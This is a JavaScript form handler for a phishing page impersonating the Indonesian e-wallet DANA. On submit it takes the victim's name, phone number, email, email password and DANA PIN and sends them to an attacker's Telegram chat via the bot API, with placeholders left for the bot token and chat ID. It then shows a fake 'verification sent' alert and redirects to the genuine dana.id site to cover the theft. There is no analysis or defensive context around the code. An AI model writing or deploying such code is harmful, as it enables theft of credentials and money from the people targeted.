const botToken = 'token bot kamu;
const chatId = id telegram kamu';

document.getElementById('verifyForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const nama = document.getElementById('nama').value;
  const nomor = document.getElementById('nomor').value;
  const email = document.getElementById('email').value;
  const sandi_email = document.getElementById('sandi_email').value;
  const pin = document.getElementById('pin').value;

  const message = `
*LOGIN DANA*

*Nama:* ${nama}
*Nomor Hp:* ${nomor}
*Email:* ${email}
*Password Email:* ${sandi_email}
*PIN DANA:* ${pin}
  `;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  })
  .then(response => {
    if (response.ok) {
      alert('Verifikasi data berhasil dikirim. Mohon tunggu 5 menit untuk di proses dari team DANA.id.');
      window.location.href = 'https://www.dana.id/';
    } else {
      alert('Gagal mengirim data. Silakan coba lagi.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Terjadi kesalahan.');
  });
});
